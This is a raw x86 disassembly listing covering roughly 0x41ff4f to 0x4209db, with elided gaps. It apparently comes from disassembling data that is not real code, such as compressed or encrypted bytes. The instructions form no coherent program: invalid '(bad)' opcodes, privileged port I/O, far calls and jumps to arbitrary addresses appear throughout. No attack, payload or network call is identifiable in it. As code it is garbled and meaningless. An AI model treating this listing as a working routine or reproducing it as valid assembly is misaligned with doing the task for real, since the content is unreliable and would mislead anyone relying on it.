  41ff4f:	mov    dl,0xd6
  41ff51:	out    dx,eax
  41ff52:	push   edx
  41ff53:	iret   
  41ff54:	sbb    DWORD PTR [edx],ebx
  41ff56:	inc    edi
  41ff57:	mov    eax,ds:0xd0d7c10e
  41ff5c:	pusha  
  41ff5d:	aam    0xa
  41ff5f:	mov    bl,0x31
  41ff61:	dec    edx
  41ff62:	add    BYTE PTR [ebx],0x27
  41ff65:	push   edi
  41ff66:	push   ebx
  41ff67:	mov    eax,ds:0xe89e2bfe
  41ff6c:	in     eax,0xde
  41ff6e:	inc    edi
  41ff6f:	aam    0x6d
  41ff71:	enter  0xcb3e,0x80
  41ff75:	and    ah,dl
  41ff77:	mov    al,ds:0xaff89343
  41ff7c:	mov    esp,0xcec96a7c
  41ff81:	test   al,0xa4
  41ff83:	adc    al,0x88
  41ff85:	xchg   DWORD PTR [edi],ebp
  41ff87:	push   cs
  41ff88:	test   eax,0xef3abf8
  41ff8d:	inc    eax
  41ff8e:	mov    dl,0x6
  41ff90:	je     0x420004
  41ff92:	clc    
  41ff93:	dec    esp
  41ff94:	div    BYTE PTR [ebx]
  41ff96:	lods   eax,DWORD PTR ds:[esi]
  41ff97:	retf   0xef5
  41ff9a:	add    BYTE PTR [ecx+0x6c],dl
  41ff9d:	and    edi,DWORD PTR [edx+edx*4+0x20]
  41ffa1:	push   0x4a139d9d
  41ffa6:	int    0x45
  41ffa8:	or     eax,0xcbcb7174
  41ffad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffae:	or     esi,DWORD PTR [ebx]
  41ffb0:	push   ds
  41ffb1:	jmp    0x41ff9e
  41ffb3:	cmp    DWORD PTR [edi+0x0],edi
	...
  420016:	bound  esp,QWORD PTR [ebp-0x8808a]
  42001c:	imul   edi,DWORD PTR [ebp-0x2ab923c6],0x4b
  420023:	push   edi
  420024:	push   es
  420025:	pop    ebp
  420026:	je     0x42007b
  420028:	add    DWORD PTR [eax],eax
  42002a:	pop    es
  42002b:	add    DWORD PTR [eax],eax
  42002d:	add    BYTE PTR [edx+0x57a8a106],cl
  420033:	push   edi
  420034:	jl     0x420018
  420036:	dec    ecx
  420037:	fwait
  420038:	or     DWORD PTR [eax-0x3f],0x32
  42003c:	cmc    
  42003d:	mov    esi,0x7eb33e88
  420042:	aaa    
  420043:	xchg   ecx,eax
  420044:	in     al,dx
  420045:	div    BYTE PTR [esi-0x61422dc5]
  42004b:	inc    edi
  42004c:	jle    0x4200a0
  42004e:	popf   
  42004f:	and    eax,0x94f5064f
  420054:	pusha  
  420055:	mov    ebx,0x4836029f
  42005a:	push   edi
  42005b:	not    DWORD PTR [edi-0x47734067]
  420061:	inc    ecx
  420062:	data16 lods al,BYTE PTR ds:[esi]
  420064:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420065:	or     DWORD PTR [esi+0x15916342],ebx
  42006b:	in     eax,dx
  42006c:	repnz xor eax,0x14de7bda
  420072:	cdq    
  420073:	xchg   ebp,eax
  420074:	ds jnp 0x420030
  420077:	pop    ss
  420078:	or     BYTE PTR [ebx+0x73172b72],ah
  42007e:	nop
  42007f:	or     dh,ah
  420081:	xor    eax,0xe2767476
  420086:	fnsave [ecx*8-0x22dcb184]
  42008d:	icebp  
  42008e:	cmc    
  42008f:	aaa    
  420090:	jl     0x420039
  420092:	ret    
  420093:	aas    
  420094:	in     al,0x75
  420096:	ret    
  420097:	jle    0x4200c1
  420099:	xor    eax,0x33985ad6
  42009e:	out    dx,al
  42009f:	xchg   ebp,eax
  4200a0:	push   0xffffff84
  4200a2:	xlat   BYTE PTR ds:[ebx]
  4200a3:	mov    ebp,0x32ff22dc
  4200a8:	adc    BYTE PTR [esi-0x23],cl
  4200ab:	call   0xa89b5609
  4200b0:	ret    
  4200b1:	stos   BYTE PTR es:[edi],al
  4200b2:	aas    
  4200b3:	mov    ah,0x3d
  4200b5:	cmp    DWORD PTR [edx+0x6d],0xffffffd8
  4200b9:	out    0xba,al
  4200bb:	xlat   BYTE PTR ds:[ebx]
  4200bc:	pop    eax
  4200bd:	(bad)  
  4200be:	cmp    esp,DWORD PTR [edx]
  4200c0:	addr16 dec eax
  4200c2:	cmp    dh,BYTE PTR [ecx-0x51]
  4200c5:	inc    BYTE PTR [ebx+0x1e8b2ed4]
  4200cb:	call   0x36bac728
  4200d0:	lds    ebx,FWORD PTR [esi+0x76]
  4200d3:	jecxz  0x420063
  4200d5:	mov    ebx,DWORD PTR [edi-0x3fc94f0f]
  4200db:	adc    al,0x93
  4200dd:	push   ebp
  4200de:	or     edx,DWORD PTR [edx]
  4200e0:	rcr    ch,0xf
  4200e3:	mov    cl,0x99
  4200e5:	jmp    0xf77bf3b3
  4200ea:	or     eax,DWORD PTR [edi+0x23c18683]
  4200f0:	adc    BYTE PTR [edx-0x1a436311],0xf
  4200f7:	sbb    ebp,DWORD PTR [ebx]
  4200f9:	sbb    al,BYTE PTR [eax-0xd]
  4200fc:	aam    0x1
  4200fe:	lods   eax,DWORD PTR ds:[esi]
  4200ff:	imul   ebx,DWORD PTR ds:0x1d76cb86,0xffffffd3
  420106:	jg     0x4200af
  420108:	jg     0x42009c
  42010a:	or     al,0xcd
  42010c:	xchg   edi,eax
  42010d:	ror    BYTE PTR [ecx],0x2d
  420110:	jnp    0x420128
  420112:	cmp    BYTE PTR [ecx+0x420d23e8],dh
  420118:	mov    ch,0xfc
  42011a:	adc    DWORD PTR [ebx+eax*2+0x5ce86ed3],ecx
  420121:	sbb    DWORD PTR [edi+0x69cf6bf8],0x1
  420128:	in     eax,0x17
  42012a:	push   eax
  42012b:	jo     0x4200fb
  42012d:	ret    0x5ab1
  420130:	inc    edi
  420131:	pop    ebp
  420132:	push   ebp
  420133:	jmp    0x420227
	...
  420194:	add    BYTE PTR [eax],al
  420196:	jae    0x420167
  420198:	fwait
  420199:	cmp    DWORD PTR [edi+0x5dcff37d],edi
  42019f:	xchg   ebp,eax
  4201a0:	xchg   ebx,eax
  4201a1:	dec    edi
  4201a2:	(bad)  
  4201a3:	mov    ebx,0x547bd58a
  4201a8:	add    DWORD PTR [eax],eax
  4201aa:	pop    es
  4201ab:	add    DWORD PTR [eax],eax
  4201ad:	add    ah,bh
  4201af:	arpl   WORD PTR [ebp-0x7c175a05],bp
  4201b5:	je     0x42022d
  4201b7:	shl    BYTE PTR [ecx+esi*8-0x2d],1
  4201bb:	inc    eax
  4201bc:	mov    esp,eax
  4201be:	sbb    eax,0x8f1e637f
  4201c3:	jbe    0x42015e
  4201c5:	adc    ch,BYTE PTR [ebx]
  4201c7:	jb     0x420210
  4201c9:	imul   eax,esi,0x3987c10b
  4201cf:	jecxz  0x4201bd
  4201d1:	ss mov edi,0xbeb9d452
  4201d7:	dec    esi
  4201d8:	and    eax,0xbe8c6f05
  4201dd:	scas   al,BYTE PTR es:[edi]
  4201de:	mul    ch
  4201e0:	xor    DWORD PTR [esi-0x389cfd3c],edx
  4201e6:	shr    BYTE PTR [edi],1
  4201e8:	jle    0x42025c
  4201ea:	and    DWORD PTR [eax-0x34feff6e],0x6279dc99
  4201f4:	cmp    ebp,esp
  4201f6:	out    dx,al
  4201f7:	mov    eax,ds:0xb766a847
  4201fc:	cmc    
  4201fd:	fld    TBYTE PTR [ecx]
  4201ff:	mov    ch,0x43
  420201:	cs adc eax,0x2ef74f92
  420207:	out    0xe5,eax
  420209:	inc    esp
  42020a:	ins    BYTE PTR es:[edi],dx
  42020b:	inc    ebp
  42020c:	in     eax,dx
  42020d:	push   esp
  42020e:	ja     0x4201cf
  420210:	add    ecx,0x6433d78d
  420216:	hlt    
  420217:	xchg   ebx,eax
  420218:	(bad)  
  420219:	dec    esp
  42021a:	jge    0x420229
  42021c:	in     al,dx
  42021d:	dec    edi
  42021e:	xchg   ebx,eax
  42021f:	out    dx,al
  420220:	ss leave 
  420222:	lea    ebp,[esi+0x4e]
  420225:	adc    al,0xc0
  420227:	push   ecx
  420228:	dec    eax
  420229:	adc    DWORD PTR [eax+ecx*2-0x38281209],0x2fc83e92
  420234:	push   edi
  420235:	mov    DWORD PTR [ebx-0x31217ce5],eax
  42023b:	mov    eax,ds:0xe13d1e02
  420240:	cmp    al,BYTE PTR [edi]
  420242:	add    dl,0x91
  420245:	retf   
  420246:	jl     0x42025d
  420248:	mov    ch,0xc6
  42024a:	test   eax,0x23a83885
  42024f:	ja     0x4202b8
  420251:	pushw  ds
  420253:	fisttp DWORD PTR [ebp+0x4e2a544e]
  420259:	mov    bh,0x67
  42025b:	mov    gs,WORD PTR [ebx]
  42025d:	pop    edx
  42025e:	cmp    BYTE PTR [esi+0x2df08b9],cl
  420264:	inc    esp
  420265:	test   eax,0xebf0b00b
  42026a:	aaa    
  42026b:	cmp    eax,0xb66378e4
  420270:	loopne 0x4202d1
  420272:	mov    edx,0xd9cd743
  420277:	retf   
  420278:	dec    eax
  420279:	adc    al,BYTE PTR [ebx]
  42027b:	call   0x906441d
  420280:	push   ds
  420281:	fldenv [ebx+ebp*1]
  420284:	mov    esp,0xb8d1a857
  420289:	in     al,0x54
  42028b:	cmp    eax,0x30b2c4a4
  420290:	test   DWORD PTR [ebx-0xd],eax
  420293:	inc    esi
  420294:	int3   
  420295:	lea    ebp,[ebx-0x51b9ce30]
  42029b:	fild   DWORD PTR [eax*8+0x320467db]
  4202a2:	and    al,0xab
  4202a4:	dec    ecx
  4202a5:	fld    DWORD PTR [ecx]
  4202a7:	mov    cl,0xc3
  4202a9:	add    esi,edi
  4202ab:	push   eax
  4202ac:	(bad)  
  4202af:	ret    0xf307
  4202b2:	mov    dh,0x77
  4202b4:	add    BYTE PTR [bx+si],al
	...
  420313:	add    BYTE PTR [eax],al
  420315:	add    BYTE PTR [ecx+0x6],al
  420318:	clc    
  420319:	mov    esi,0xff47feff
  42031e:	mov    cl,0x27
  420320:	pop    ebx
  420321:	fist   WORD PTR [ebx-0x9]
  420324:	and    BYTE PTR [ecx+0x15582],ch
  42032a:	pop    es
  42032b:	add    DWORD PTR [eax],eax
  42032d:	add    BYTE PTR [edi+ebp*4+0xc1aaee6],al
  420334:	ss jns 0x420390
  420337:	jge    0x420353
  420339:	inc    ebp
  42033a:	sbb    BYTE PTR [ebx-0x2e68e343],0x81
  420341:	imul   DWORD PTR [esi-0x54]
  420344:	ins    DWORD PTR es:[edi],dx
  420345:	cmp    al,0x7b
  420347:	add    DWORD PTR [eax-0x6b],0x53
  42034b:	pop    eax
  42034c:	adc    BYTE PTR [edi-0x50],0x8d
  420350:	and    edi,DWORD PTR [ebx]
  420352:	pop    ebx
  420353:	lea    ebx,[ebx]
  420355:	mov    eax,ds:0x77943dd2
  42035a:	gs enter 0xb89f,0xda
  42035f:	pop    edx
  420360:	das    
  420361:	push   ss
  420362:	and    bh,dl
  420364:	xor    al,0xbf
  420366:	add    eax,0xee15b1d2
  42036b:	shl    DWORD PTR [edi-0x2391e166],cl
  420371:	(bad)
  420376:	pop    edi
  420377:	scas   al,BYTE PTR es:[edi]
  420378:	pop    ds
  420379:	mov    dl,0x10
  42037b:	xor    BYTE PTR [ebp+edx*4-0x4c],cl
  42037f:	mov    al,ds:0xb785805e
  420384:	test   DWORD PTR [edi],ebp
  420386:	pop    esp
  420387:	push   eax
  420388:	mov    al,0xa
  42038a:	mov    edi,0x6d00b873
  42038f:	call   0x1e56:0x71bd12eb
  420396:	xor    eax,0x71d8db9b
  42039b:	repz fstp TBYTE PTR [edi-0x5b4ba307]
  4203a2:	dec    esp
  4203a3:	(bad)  
  4203a4:	mov    dh,BYTE PTR [esi-0x10]
  4203a7:	adc    eax,0xcc42d406
  4203ac:	adc    al,0x34
  4203af:	mov    edi,0x44d0d3c1
  4203b4:	mov    eax,gs:0x2eac2e23
  4203ba:	pop    edx
  4203bb:	jno    0x4203f6
  4203bd:	in     eax,0x2f
  4203bf:	retf   
  4203c0:	and    BYTE PTR [ebx+0x30ab2c49],0x35
  4203c7:	cmp    al,0x4
  4203c9:	adc    al,BYTE PTR [eax+edi*2]
  4203cc:	xor    al,0x94
  4203ce:	and    dl,ah
  4203d0:	jl     0x42035b
  4203d2:	mov    BYTE PTR [esi-0x1c0a6bac],cl
  4203d8:	(bad)  
  4203d9:	outs   dx,BYTE PTR ds:[esi]
  4203da:	cwde   
  4203db:	ss inc esi
  4203dd:	mov    ch,ah
  4203df:	in     eax,0x5f
  4203e1:	inc    esi
  4203e2:	loope  0x420447
  4203e4:	enter  0x7db8,0x7a
  4203e8:	pushf  
  4203e9:	inc    edx
  4203ea:	test   dh,0xd1
  4203ed:	cdq    
  4203ee:	dec    esp
  4203ef:	ss pop edi
  4203f1:	popa   
  4203f2:	daa    
  4203f3:	aaa    
  4203f4:	xor    edi,DWORD PTR [esi]
  4203f6:	fmul   QWORD PTR [esi-0x29]
  4203f9:	mov    al,0x11
  4203fb:	aas    
  4203fc:	cbw    
  4203fe:	add    ebp,DWORD PTR [ebp+0x5371535d]
  420404:	and    al,BYTE PTR [eax+eax*8]
  420407:	dec    esp
  420408:	hlt    
  420409:	push   ebp
  42040a:	and    bh,cl
  42040c:	xor    edx,DWORD PTR [ebx+ebx*4-0x71]
  420410:	xchg   ecx,eax
  420411:	jno    0x42039b
  420413:	cdq    
  420414:	mov    ebx,0xffaebaca
  420419:	push   eax
  42041a:	lods   eax,DWORD PTR ds:[esi]
  42041b:	shl    BYTE PTR [ebp-0x64],0x1d
  42041f:	adc    eax,0x85554603
  420424:	xor    DWORD PTR [ecx+0x7e2f935c],ecx
  42042a:	or     BYTE PTR ds:0x1dbaaf65,ah
  420430:	call   0x0:0x5dfab09c
	...
  420493:	add    BYTE PTR [eax],al
  420495:	add    BYTE PTR [esi+0x7f125794],ch
  42049b:	shr    edi,cl
  42049d:	mov    esp,0xb41496f0
  4204a2:	mov    edx,DWORD PTR [esi-0x3]
  4204a5:	or     ecx,DWORD PTR [ecx+0x7000156]
  4204ab:	add    DWORD PTR [eax],eax
  4204ad:	add    BYTE PTR [ebx+0x1c],al
  4204b0:	dec    edx
  4204b1:	jle    0x42048f
  4204b3:	sbb    edi,DWORD PTR [ecx]
  4204b5:	mov    al,ds:0x76314287
  4204ba:	ss dec eax
  4204bc:	push   esi
  4204bd:	push   ds
  4204be:	sbb    BYTE PTR [ebp+eiz*2-0x32],cl
  4204c2:	and    BYTE PTR [esi],0x4d
  4204c5:	retf   
  4204c6:	in     eax,0x57
  4204c8:	jo     0x4204cd
  4204ca:	lods   al,BYTE PTR ds:[esi]
  4204cb:	cmp    eax,DWORD PTR [esi-0x61]
  4204ce:	(bad)  
  4204cf:	repnz xlat BYTE PTR ds:[ebx]
  4204d1:	add    bh,BYTE PTR [ecx]
  4204d3:	jmp    0xac6fdd68
  4204d8:	stos   DWORD PTR es:[edi],eax
  4204d9:	fistp  WORD PTR [esi+ebx*4+0x6bd11051]
  4204e0:	call   0x42d8d909
  4204e5:	fistp  DWORD PTR [ebx-0x4ff26b5d]
  4204eb:	mov    ebx,gs
  4204ed:	repnz lods al,BYTE PTR ds:[esi]
  4204ef:	pushf  
  4204f0:	pop    edi
  4204f1:	adc    esi,DWORD PTR [edi]
  4204f3:	bound  ecx,QWORD PTR [edi]
  4204f5:	cmp    al,0x93
  4204f7:	lods   eax,DWORD PTR ds:[esi]
  4204f8:	xlat   BYTE PTR ds:[ebx]
  4204f9:	stc    
  4204fa:	js     0x42055f
  4204fc:	loop   0x420578
  4204fe:	cmp    DWORD PTR [edi],ecx
  420500:	bound  esi,QWORD PTR [ebp-0x78]
  420503:	ds and eax,0x7abbfaa5
  420509:	icebp  
  42050a:	out    0x72,al
  42050c:	cli    
  42050d:	mov    BYTE PTR [eax+0x6954829a],ah
  420513:	push   es
  420514:	mov    ds:0x484adc0a,al
  420519:	hlt    
  42051a:	jmp    0x147700bc
  42051f:	inc    ecx
  420520:	xor    eax,0x9fcb3d3e
  420525:	pop    ebp
  420526:	xchg   ebp,eax
  420527:	mov    cl,0x49
  420529:	jno    0x4204cc
  42052b:	and    ebp,DWORD PTR [ecx]
  42052d:	enter  0xde97,0x95
  420531:	call   0xc2636c3c
  420536:	pop    esp
  420537:	sahf   
  420538:	stos   DWORD PTR es:[edi],eax
  420539:	aaa    
  42053a:	push   eax
  42053b:	in     eax,dx
  42053c:	clc    
  42053d:	in     al,0x9d
  42053f:	or     al,0x53
  420541:	test   al,0xe3
  420543:	arpl   WORD PTR [ebx+0x657ba4d8],sp
  420549:	int3   
  42054a:	mov    ebx,fs
  42054c:	sbb    al,BYTE PTR ds:0xaf485cd3
  420552:	(bad)  
  420553:	mov    ds:0x7d5bd25,al
  420558:	mul    DWORD PTR [ebx-0x16]
  42055b:	xor    al,0x28
  42055d:	sub    eax,0xb4ebe63b
  420562:	xor    BYTE PTR [esi+0x357f2a47],0x4d
  420569:	xor    DWORD PTR [ebx+ebx*4],eax
  42056c:	xchg   edi,eax
  42056d:	add    al,0x2c
  42056f:	xor    eax,0x85d7a369
  420574:	scas   eax,DWORD PTR es:[edi]
  420575:	ins    DWORD PTR es:[edi],dx
  420576:	cmc    
  420577:	mov    ch,0x18
  420579:	scas   eax,DWORD PTR es:[edi]
  42057a:	adc    al,0xea
  42057c:	push   ebp
  42057d:	xchg   edx,eax
  42057e:	into   
  42057f:	pop    eax
  420580:	lods   al,BYTE PTR ds:[esi]
  420581:	iret   
  420582:	out    dx,eax
  420583:	sub    esi,DWORD PTR [edx-0x6c865eea]
  420589:	cmp    ebp,ebp
  42058b:	test   BYTE PTR [ebp-0x29],dl
  42058e:	loop   0x4205af
  420590:	sbb    al,BYTE PTR [eax+0x35]
  420593:	jp     0x4205e5
  420595:	adc    eax,0x5382f00b
  42059a:	pop    ss
  42059b:	and    edx,DWORD PTR [eax]
  42059d:	sar    edi,0x2e
  4205a0:	mov    ds:0x945eed8,eax
  4205a5:	inc    ebp
  4205a6:	add    BYTE PTR [ecx+0x10],bl
  4205a9:	fwait
  4205aa:	call   0x5dbd5d6c
  4205af:	fwait
  4205b0:	mov    eax,ds:0x2a95e336
	...
  420615:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  42061c:	mov    ah,0xec
  42061e:	btc    DWORD PTR [edx],edx
  420621:	mov    ebx,0x6fd80c30
  420626:	nop
  420627:	push   edi
  420628:	add    DWORD PTR [eax],eax
  42062a:	pop    es
  42062b:	add    DWORD PTR [eax],eax
  42062d:	add    BYTE PTR [ebp+ecx*1-0x34c3e0ed],dh
  420634:	dec    esi
  420635:	dec    ebx
  420636:	or     eax,0xfb43a456
  42063b:	dec    ebx
  42063c:	jnp    0x4205e5
  42063e:	push   0x11
  420640:	jecxz  0x42061c
  420642:	jne    0x420685
  420644:	mov    DWORD PTR [edx],eax
  420646:	mov    dl,0xd7
  420648:	(bad)  
  420649:	xor    eax,0xceedb9b0
  42064e:	ret    0xa7e8
  420651:	call   eax
  420653:	pop    ebx
  420654:	push   ebx
  420655:	cs pop esp
  420657:	jecxz  0x420620
  420659:	jbe    0x4206b8
  42065b:	add    al,0x47
  42065d:	add    DWORD PTR [ecx-0x23939180],edi
  420663:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420664:	push   edx
  420665:	or     cl,dl
  420667:	ins    BYTE PTR es:[edi],dx
  420668:	cmp    dh,dl
  42066a:	popf   
  42066b:	pop    ss
  42066c:	jns    0x420634
  42066e:	pop    es
  42066f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420670:	add    al,0xcf
  420672:	sub    eax,0x6b66b3d0
  420677:	retf   0xd7e6
  42067a:	out    dx,eax
  42067b:	jns    0x42060f
  42067d:	jge    0x4206a7
  42067f:	or     eax,0x99c86f5d
  420684:	sbb    bl,BYTE PTR [edx-0x6ca5ce25]
  42068a:	test   al,0xae
  42068d:	jge    0x420679
  42068f:	xchg   esi,eax
  420690:	mov    DWORD PTR [ecx-0x315a1a8b],0xe5b1563b
  42069a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42069b:	test   BYTE PTR [eax+ebx*4-0x14],cl
  42069f:	in     al,dx
  4206a0:	or     al,0x21
  4206a2:	mov    edx,0x27b3e820
  4206a7:	push   0x4d38d1cd
  4206ac:	out    0x8b,al
  4206ae:	sbb    esi,DWORD PTR [ebx]
  4206b0:	popa   
  4206b1:	cld    
  4206b2:	xchg   ebp,eax
  4206b3:	jge    0xa5d76b1a
  4206b9:	push   ds
  4206ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206bb:	dec    ebp
  4206bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206bd:	fst    QWORD PTR [edx+0x2f14bca6]
  4206c3:	(bad)  
  4206c5:	xor    eax,0x5deb088d
  4206ca:	sbb    edx,DWORD PTR [eax+0x49]
  4206cd:	(bad)  
  4206ce:	(bad)  
  4206d0:	xchg   edi,eax
  4206d1:	adc    BYTE PTR [esi+0x16],0x9b
  4206d5:	push   0xaaeb93a
  4206da:	(bad)  
  4206db:	sbb    DWORD PTR [eax+0x4310f2c8],ecx
  4206e1:	rcl    BYTE PTR [edx-0x5b],1
  4206e4:	push   esp
  4206e5:	or     al,0x80
  4206e7:	bnd addr16 jb 0x420720
  4206eb:	out    dx,eax
  4206ec:	push   ebp
  4206ed:	dec    ebx
  4206ee:	or     esi,ebx
  4206f0:	ret    
  4206f1:	sub    bl,dl
  4206f3:	push   cs
  4206f4:	sbb    BYTE PTR [edi+0x2e2517f5],ch
  4206fa:	push   ss
  4206fb:	ds in  eax,dx
  4206fd:	loope  0x4206bc
  4206ff:	icebp  
  420700:	mov    al,0xe7
  420702:	es pop esp
  420704:	adc    esi,DWORD PTR ds:0x9452444e
  42070a:	cmp    al,0x46
  42070c:	shr    ecx,1
  42070e:	cmp    dl,0x97
  420711:	sub    ah,BYTE PTR [edx-0x77]
  420714:	daa    
  420715:	ins    DWORD PTR es:[edi],dx
  420716:	outs   dx,BYTE PTR ds:[esi]
  420717:	out    0x8f,eax
  420719:	pop    es
  42071a:	mov    edx,eax
  42071c:	xor    eax,0xa6d3e0e6
  420721:	in     eax,dx
  420722:	popa   
  420723:	sub    al,BYTE PTR [ecx+ecx*4+0x52]
  420727:	xchg   ebx,eax
  420728:	push   ebx
  420729:	sti    
  42072a:	neg    BYTE PTR [esi]
  42072c:	inc    ebx
  42072d:	xchg   DWORD PTR [edx+0x2ff4e117],ebp
  420733:	leave  
  420734:	push   ds
	...
  420795:	add    BYTE PTR [ecx-0x587fdad1],cl
  42079b:	mov    ch,BYTE PTR [ebp-0x642816d1]
  4207a1:	sub    eax,DWORD PTR [edi-0x7d]
  4207a4:	jo     0x420825
  4207a6:	xchg   edi,eax
  4207a7:	pop    eax
  4207a8:	add    DWORD PTR [eax],eax
  4207aa:	pop    es
  4207ab:	add    DWORD PTR [eax],eax
  4207ad:	add    dl,cl
  4207af:	stos   BYTE PTR es:[edi],al
  4207b0:	ja     0x420796
  4207b2:	cld    
  4207b3:	mov    ah,0x52
  4207b5:	sub    eax,DWORD PTR [esi-0x6c]
  4207b8:	inc    esp
  4207b9:	or     eax,0xec00d56a
  4207be:	sahf   
  4207bf:	push   ss
  4207c0:	retf   
  4207c1:	xchg   edi,eax
  4207c2:	sbb    DWORD PTR [ebp+0x609cbb12],0xb4fb9231
  4207cc:	aaa    
  4207cd:	lods   al,BYTE PTR ds:[esi]
  4207ce:	pop    ebx
  4207cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207d0:	pop    eax
  4207d1:	jb     0x420753
  4207d3:	lea    ebx,[eax-0x52]
  4207d6:	xchg   esp,eax
  4207d7:	dec    DWORD PTR [edi]
  4207d9:	mov    esi,es
  4207db:	inc    ebp
  4207dc:	popa   
  4207dd:	sbb    DWORD PTR [esi+0x2e],0x1a1186b1
  4207e4:	add    dl,al
  4207e6:	hlt    
  4207e7:	(bad)  [ecx+0x347e8e8a]
  4207ed:	jnp    0x42083c
  4207ef:	sub    al,0x36
  4207f1:	mov    ebx,eax
  4207f3:	cld    
  4207f4:	pop    ecx
  4207f5:	and    eax,DWORD PTR [edx-0x2df8114a]
  4207fb:	fwait
  4207fc:	and    eax,0xa22c9cc7
  420801:	xor    ah,BYTE PTR [eax-0x78fdc443]
  420807:	std    
  420808:	xchg   edx,eax
  420809:	into   
  42080a:	dec    ebx
  42080b:	xchg   ebp,eax
  42080c:	inc    edi
  42080d:	inc    esp
  42080e:	inc    esp
  42080f:	cld    
  420810:	dec    BYTE PTR [esi-0x42a065cb]
  420816:	rol    BYTE PTR [edi+esi*8],0x43
  42081a:	pop    ecx
  42081b:	dec    BYTE PTR [esi]
  42081d:	mov    dh,BYTE PTR [ebx-0x4c]
  420820:	je     0x420842
  420822:	push   ss
  420823:	fst    DWORD PTR [esi]
  420825:	adc    al,0xcc
  420827:	cmp    esi,DWORD PTR [ecx+0x6a613d7b]
  42082d:	xor    eax,0xc9759b41
  420832:	mov    bh,0xbc
  420834:	adc    ecx,DWORD PTR [eax+ebx*4-0x44]
  420838:	mov    cl,0x41
  42083a:	push   ss
  42083b:	cmp    eax,0x9f789706
  420840:	mov    ah,0xa2
  420842:	cmp    DWORD PTR [ebx+0x349b3442],edx
  420848:	cld    
  420849:	outs   dx,DWORD PTR ds:[esi]
  42084a:	mov    dl,0xe8
  42084c:	sub    eax,0xaaa3557
  420851:	push   ebp
  420852:	xchg   edx,eax
  420853:	arpl   WORD PTR [ebx+0x472fbc6a],di
  420859:	mov    ?,WORD PTR [ebp-0x75792718]
  42085f:	aas    
  420860:	lods   eax,DWORD PTR ds:[esi]
  420861:	fwait
  420862:	(bad)  
  420863:	fcomp  DWORD PTR [esp+ebx*2]
  420866:	idiv   DWORD PTR [ebx+0x7b]
  420869:	data16 stos BYTE PTR es:[edi],al
  42086b:	fisttp WORD PTR [eax+0x2bb0a9c6]
  420871:	fidiv  WORD PTR [edx+ebx*4+0x5d]
  420875:	dec    esp
  420876:	mov    DWORD PTR [ecx],ecx
  420878:	push   es
  420879:	not    BYTE PTR ds:0x8d7fc768
  42087f:	jbe    0x42085a
  420881:	test   BYTE PTR [ebp+ebx*8-0x1dfdac8c],dh
  420888:	in     al,0xd5
  42088a:	jecxz  0x420827
  42088c:	popf   
  42088d:	jge    0x4208d3
  42088f:	mov    ebx,DWORD PTR [eax-0x22b94da]
  420895:	div    DWORD PTR [edx-0x4c702196]
  42089b:	cld    
  42089c:	cmc    
  42089d:	mov    ah,0xaf
  42089f:	xlat   BYTE PTR ds:[ebx]
  4208a0:	imul   edx,ebp,0xffffffe4
  4208a3:	arpl   WORD PTR [edx-0x6a],si
  4208a6:	fsub   st(4),st
  4208a8:	je     0x4208be
  4208aa:	mov    ecx,0x35f29937
  4208af:	and    al,0x45
  4208b1:	ja     0x420845
  4208b3:	push   ebx
  4208b4:	xchg   ebx,eax
	...
  420915:	add    ah,bl
  420917:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420918:	jae    0x420967
  42091a:	jnp    0x4208fb
  42091c:	(bad)  
  42091d:	mov    ch,0x79
  42091f:	jne    0x42092f
  420921:	ret    0x70e7
  420924:	call   eax
  420926:	sahf   
  420927:	pop    ecx
  420928:	add    DWORD PTR [eax],eax
  42092a:	pop    es
  42092b:	add    DWORD PTR [eax],eax
  42092d:	add    BYTE PTR [ecx-0x61],cl
  420930:	out    0xfa,eax
  420932:	push   eax
  420933:	shl    DWORD PTR [eax-0x78fca469],0x7
  42093a:	mov    ds:0x3c99dc6d,al
  42093f:	fild   WORD PTR [edx]
  420941:	jbe    0x42091f
  420943:	fcom   DWORD PTR [esi+0x2cdf5618]
  420949:	(bad)  
  42094a:	sub    edi,edi
  42094c:	push   ebx
  42094d:	jne    0x42099e
  42094f:	inc    ebp
  420950:	pop    ss
  420951:	add    DWORD PTR [ebx-0x63],esi
  420954:	jmp    0xa876:0x28ae0f2c
  42095b:	cmc    
  42095c:	out    0xc6,eax
  42095e:	sub    DWORD PTR [eax-0x7f],ebp
  420961:	sub    BYTE PTR [eax+0x611cd3a1],ah
  420967:	xchg   edx,eax
  420968:	pop    ds
  420969:	add    eax,0xb36524d1
  42096e:	mov    dh,0x5e
  420970:	xor    DWORD PTR [ebx],eax
  420972:	icebp  
  420973:	push   esp
  420974:	pop    ecx
  420975:	dec    ebx
  420976:	jmp    0x420916
  420978:	sub    BYTE PTR [ebp-0x3b85a537],bl
  42097e:	sub    eax,0x53b65652
  420983:	pop    ecx
  420984:	add    al,0x74
  420986:	mov    ebx,0xdf799894
  42098b:	fwait
  42098c:	mov    DWORD PTR [ebp-0x3b99a8b0],edi
  420992:	push   eax
  420993:	xor    eax,0x37e5a379
  420998:	cmp    eax,0x409b48f3
  42099d:	cmp    al,0x95
  42099f:	aam    0x4f
  4209a1:	cdq    
  4209a2:	adc    BYTE PTR [ebp+0x22],bl
  4209a5:	in     eax,0xa5
  4209a7:	mov    DWORD PTR [ebp-0x1c90107a],eax
  4209ad:	push   0xab8a0e23
  4209b2:	into   
  4209b3:	push   cs
  4209b4:	adc    BYTE PTR [eax+0x1b],bl
  4209b7:	jge    0x4209e6
  4209b9:	jle    0x4209c3
  4209bb:	int    0x70
  4209bd:	imul   ebp,eax,0x84360948
  4209c3:	xchg   esi,eax
  4209c4:	icebp  
  4209c5:	xchg   esi,eax
  4209c6:	imul   eax,DWORD PTR [edx],0xffffffe1
  4209c9:	cmp    eax,0x4903ee61
  4209ce:	mov    bh,0x0
  4209d0:	lea    edx,[esi+0x26]
  4209d3:	xchg   esi,eax
  4209d4:	pop    es
  4209d5:	outs   dx,BYTE PTR ds:[esi]
  4209d6:	ins    BYTE PTR es:[edi],dx
  4209d7:	pop    ss
  4209d8:	and    DWORD PTR [ecx-0x55],ebx
  4209db:	fs shl esi,0x8b
